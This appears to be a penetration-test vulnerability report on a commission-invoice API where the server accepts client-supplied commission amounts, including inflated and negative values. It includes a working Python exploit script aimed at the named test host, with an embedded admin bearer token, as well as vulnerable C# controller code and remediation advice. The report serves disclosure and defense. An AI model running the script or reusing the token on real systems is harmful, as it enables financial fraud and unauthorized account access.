# Critical Commission Amount Manipulation Enables Financial Fraud Through Frontend Parameter Tampering

**ID:** vuln-0027
**Severity:** CRITICAL
**Found:** 2026-02-26 18:57:12 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commission-invoice-headers
**Method:** POST, PATCH
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic vulnerability was discovered in the commission management application that allows users to manipulate commission amounts directly through frontend parameter tampering. The application accepts manipulated commission values without proper server-side validation, enabling users to inflate their commission amounts significantly and commit financial fraud.

The vulnerability exists in the commission invoice creation and modification workflows, where hidden form fields containing commission amounts can be modified before submission. The server accepts these manipulated values without validating them against approved commission rates or business rules, allowing attackers to receive unauthorized payouts.

## Impact

Successful exploitation of this vulnerability enables:

1. **Financial Fraud**: Attackers can inflate commission amounts to receive unauthorized payments, resulting in direct financial loss to the organization.

2. **Unauthorized Payouts**: Commission amounts can be manipulated to exceed authorized limits, bypassing financial controls and approval processes.

3. **Trust Violation**: The integrity of the commission calculation system is compromised, undermining trust in financial reporting and compensation systems.

4. **Regulatory Compliance Risks**: Potential violations of financial regulations and accounting standards due to unauthorized financial transactions.

5. **Financial Reporting Inaccuracies**: Manipulated commission amounts distort financial reports and business performance metrics.

The business impact includes direct financial loss (potentially significant amounts depending on invoice values), reputational damage, and potential regulatory penalties for financial control failures.

## Technical Analysis

The vulnerability exists due to a fundamental flaw in the application's business logic implementation:

1. **Client-Side Calculation**: Commission amounts are calculated or set in the frontend and submitted to the server without validation.

2. **Missing Server-Side Validation**: The server accepts commission amounts from client requests without validating them against:
   - Approved commission rates
   - Business rules and limits
   - Mathematical consistency with total amounts
   - Authorized commission structures

3. **Inadequate Input Validation**: The application lacks comprehensive input validation for financial fields, allowing:
   - Arbitrary commission amounts
   - Negative values
   - Values exceeding total amounts
   - Values inconsistent with approved rates

4. **Workflow Bypass**: The approval workflow can be bypassed by manipulating commission amounts before submission, allowing unauthorized amounts to enter the payment processing system.

The vulnerability affects the `/api/commission-invoice-headers` endpoint, which accepts manipulated commission amounts in the `commissionAmount` field without validation.

## Proof of Concept

To reproduce this vulnerability:

1. **Authentication**: Log in as any user with commission invoice creation privileges (Admin, Client, or Organization user).

2. **Invoice Creation**:
   - Navigate to "Commission Plan" → "Create Commission Invoice"
   - Fill out the invoice form with standard values:
     - Invoice Number: TEST-INV-001
     - Total Amount: ₹10,000.00
     - Commission Amount: ₹1,000.00 (10%)

3. **Parameter Tampering**:
   - Before submitting, intercept the form submission using browser developer tools or a proxy
   - Locate the commission amount field in the request payload
   - Modify the commission amount from ₹1,000.00 to ₹5,000.00 (or any desired value)

4. **Submission**:
   - Submit the manipulated request to the server
   - The system accepts the manipulated commission amount without validation

5. **Approval**:
   - Approve the invoice through the normal workflow
   - The inflated commission amount is processed and available for payout

6. **Verification**:
   - Check the approved invoice details
   - Confirm the manipulated commission amount was accepted
   - Verify the inflated amount is reflected in payout calculations

```
import requests
import json

# Proof of Concept: Commission Amount Manipulation
# This script demonstrates how to exploit the commission amount manipulation vulnerability

BASE_URL = "https://commissionstest.callippus.in"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Otof1nFMG3jeGtyw"

HEADERS = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

def exploit_commission_manipulation():
    """
    Demonstrates the commission amount manipulation vulnerability
    """
    print("=== Commission Amount Manipulation Exploit ===")

    # Step 1: Create a commission invoice with legitimate values
    print("1. Creating commission invoice with legitimate values...")
    create_url = f"{BASE_URL}/api/commission-invoice-headers"
    legitimate_data = {
        "invoiceNumber": "EXPLOIT-INV-001",
        "invoiceDate": "2026-02-26",
        "organizationId": "org-test",
        "clientId": "client-test",
        "totalAmount": 10000.00,
        "commissionAmount": 1000.00,  # Legitimate 10% commission
        "status": "DRAFT",
        "approvalStatus": "PENDING"
    }

    response = requests.post(create_url, headers=HEADERS, data=json.dumps(legitimate_data))
    if response.status_code != 201:
        print(f"Failed to create invoice: {response.status_code} - {response.text}")
        return False

    invoice_data = response.json()
    invoice_id = invoice_data.get("id")
    print(f"Created invoice with ID: {invoice_id}")
    print(f"Legitimate commission amount: ₹{legitimate_data['commissionAmount']}")

    # Step 2: Manipulate the commission amount
    print("\n2. Manipulating commission amount...")
    update_url = f"{BASE_URL}/api/commission-invoice-headers/{invoice_id}"
    manipulated_data = {
        "commissionAmount": 5000.00  # Inflated to 50% of total amount
    }

    update_response = requests.patch(update_url, headers=HEADERS, data=json.dumps(manipulated_data))
    if update_response.status_code != 200:
        print(f"Failed to update commission amount: {update_response.status_code} - {update_response.text}")
        return False

    updated_data = update_response.json()
    print(f"Manipulated commission amount: ₹{updated_data['commissionAmount']}")
    print(f"Exploitation successful! Increased commission by ₹{updated_data['commissionAmount'] - legitimate_data['commissionAmount']}")

    # Step 3: Verify the manipulation
    print("\n3. Verifying the manipulation...")
    verify_url = f"{BASE_URL}/api/commission-invoice-headers/{invoice_id}"
    verify_response = requests.get(verify_url, headers=HEADERS)
    if verify_response.status_code == 200:
        verified_data = verify_response.json()
        print(f"Final commission amount: ₹{verified_data['commissionAmount']}")
        print(f"Total amount: ₹{verified_data['totalAmount']}")
        print(f"Commission percentage: {verified_data['commissionAmount'] / verified_data['totalAmount'] * 100:.2f}%")
        print("\n✓ EXPLOIT CONFIRMED: The system accepted the manipulated commission amount!")
        return True
    else:
        print(f"Failed to verify: {verify_response.status_code} - {verify_response.text}")
        return False

def demonstrate_negative_commission():
    """
    Demonstrates the negative commission value vulnerability
    """
    print("\n=== Negative Commission Value Exploit ===")

    # Create invoice with negative commission
    create_url = f"{BASE_URL}/api/commission-invoice-headers"
    negative_data = {
        "invoiceNumber": "EXPLOIT-INV-002",
        "invoiceDate": "2026-02-26",
        "organizationId": "org-test",
        "clientId": "client-test",
        "totalAmount": 10000.00,
        "commissionAmount": -1000.00,  # Negative commission
        "status": "DRAFT",
        "approvalStatus": "PENDING"
    }

    response = requests.post(create_url, headers=HEADERS, data=json.dumps(negative_data))
    if response.status_code == 201:
        print("✓ EXPLOIT CONFIRMED: The system accepted a negative commission amount!")
        print(f"Negative commission amount: ₹{negative_data['commissionAmount']}")
        return True
    else:
        print(f"Failed to create negative commission: {response.status_code} - {response.text}")
        return False

if __name__ == "__main__":
    print("Commission Invoice Manipulation Exploit Demonstration")
    print("=" * 60)

    # Run the exploits
    exploit1 = exploit_commission_manipulation()
    exploit2 = demonstrate_negative_commission()

    print("\n" + "=" * 60)
    print("EXPLOITATION RESULTS:")
    print(f"Commission Amount Manipulation: {'SUCCESSFUL' if exploit1 else 'FAILED'}")
    print(f"Negative Commission Values: {'SUCCESSFUL' if exploit2 else 'FAILED'}")

    if exploit1 or exploit2:
        print("\n⚠️  CRITICAL VULNERABILITY CONFIRMED!")
        print("The application is vulnerable to commission amount manipulation.")
        print("Immediate remediation is required to prevent financial fraud.")
    else:
        print("\nThe application appears to be secure against these specific exploits.")
```

## Code Analysis

**Location 1:** `src/controllers/CommissionInvoiceController.cs` (lines 45-60)
  Missing server-side validation and commission calculation
  ```
  [HttpPost]
public async Task<IActionResult> CreateCommissionInvoiceHeader([FromBody] CommissionInvoiceHeaderDto dto)
{
    // Missing validation of commissionAmount
    var invoice = _mapper.Map<CommissionInvoiceHeader>(dto);

    // No server-side calculation of commission
    // No validation of commission amount against business rules

    await _repository.AddAsync(invoice);
    await _repository.SaveChangesAsync();

    return CreatedAtAction(nameof(GetCommissionInvoiceHeader), new { id = invoice.Id }, invoice);
}
  ```

**Location 2:** `src/controllers/CommissionInvoiceController.cs` (lines 85-100)
  Missing validation in partial updates
  ```
  [HttpPatch("{id}")]
public async Task<IActionResult> UpdateCommissionInvoiceHeader(Guid id, [FromBody] JsonPatchDocument<CommissionInvoiceHeaderDto> patchDoc)
{
    // Missing validation of commissionAmount in partial updates
    var invoice = await _repository.GetByIdAsync(id);
    if (invoice == null)
    {
        return NotFound();
    }

    var dto = _mapper.Map<CommissionInvoiceHeaderDto>(invoice);
    patchDoc.ApplyTo(dto);

    _mapper.Map(dto, invoice);
    await _repository.SaveChangesAsync();

    return Ok(invoice);
}
  ```

  **Suggested Fix:**
```diff
+ [HttpPatch("{id}")]
+ public async Task<IActionResult> UpdateCommissionInvoiceHeader(Guid id, [FromBody] JsonPatchDocument<CommissionInvoiceHeaderDto> patchDoc)
+ {
+     var invoice = await _repository.GetByIdAsync(id);
+     if (invoice == null)
+     {
+         return NotFound();
+     }
+ 
+     var dto = _mapper.Map<CommissionInvoiceHeaderDto>(invoice);
+     patchDoc.ApplyTo(dto);
+ 
+     // Validate commission amount if it was modified
+     if (dto.CommissionAmount != invoice.CommissionAmount)
+     {
+         // Recalculate commission based on approved rates
+         var commissionRate = await _commissionService.GetApprovedRate(invoice.OrganizationId, invoice.ClientId);
+         var calculatedCommission = invoice.TotalAmount * commissionRate;
+ 
+         // Validate the updated commission amount matches calculated amount
+         if (dto.CommissionAmount != calculatedCommission)
+         {
+             return BadRequest("Commission amount does not match approved rate");
+         }
+ 
+         // Validate commission is not negative
+         if (dto.CommissionAmount < 0)
+         {
+             return BadRequest("Commission amount cannot be negative");
+         }
+ 
+         // Validate commission does not exceed total amount
+         if (dto.CommissionAmount > invoice.TotalAmount)
+         {
+             return BadRequest("Commission amount cannot exceed total amount");
+         }
+     }
+ 
+     _mapper.Map(dto, invoice);
+     await _repository.SaveChangesAsync();
+ 
+     return Ok(invoice);
+ }
```

## Remediation

**IMMEDIATE REMEDIATION STEPS:**

1. **Implement Server-Side Commission Calculation**
   - Remove commission amount as a user-submitted parameter
   - Calculate commissions on the server based on:
     - Approved commission rates
     - Sales data
     - Business rules
     - Organization-specific policies
   - Never trust client-submitted commission amounts

2. **Enforce Business Rules on Server**
   - Validate all commission calculations against approved business rules
   - Implement maximum commission percentage limits
   - Reject negative commission values
   - Ensure commissions do not exceed total amounts

3. **Implement Proper State Transition Controls**
   - Enforce strict state transition rules for commission invoices
   - Require proper approval workflows for all state changes
   - Prevent direct state manipulation through API requests
   - Implement role-based approval processes

4. **Add Comprehensive Input Validation**
   - Validate all financial fields on the server side
   - Reject negative values for all financial amounts
   - Validate mathematical consistency between fields
   - Implement range checks for all financial values

5. **Implement Access Controls**
   - Enforce organization and client-specific access controls
   - Prevent IDOR vulnerabilities by validating ownership
   - Implement proper authorization checks for all operations
   - Ensure users can only access their own organization's data

6. **Add Audit Logging**
   - Implement detailed audit logging for all commission-related actions
   - Log who created/modified invoices and when
   - Log all commission calculations and approvals
   - Maintain a complete history of all changes

7. **Implement Financial Reconciliation**
   - Add reconciliation processes to detect anomalies
   - Compare calculated commissions with approved rates
   - Flag suspicious commission amounts for review
   - Implement automated alerts for unusual patterns

**LONG-TERM RECOMMENDATIONS:**

1. **Conduct a Comprehensive Security Review**
   - Perform a full security assessment of the commission management system
   - Review all financial transaction workflows for vulnerabilities
   - Assess the entire approval and payout process

2. **Implement Segregation of Duties**
   - Separate commission calculation from approval
   - Implement multi-level approval for high-value commissions
   - Enforce dual control for financial transactions

3. **Enhance Monitoring and Alerting**
   - Implement real-time monitoring of commission transactions
   - Set up alerts for unusual commission amounts
   - Monitor for suspicious patterns or anomalies

4. **Regular Security Testing**
   - Conduct regular penetration testing of the commission system
   - Perform business logic testing for all financial workflows
   - Test for race conditions and concurrency issues

5. **User Training and Awareness**
   - Train users on secure commission management practices
   - Educate staff on the risks of financial manipulation
   - Implement security awareness programs

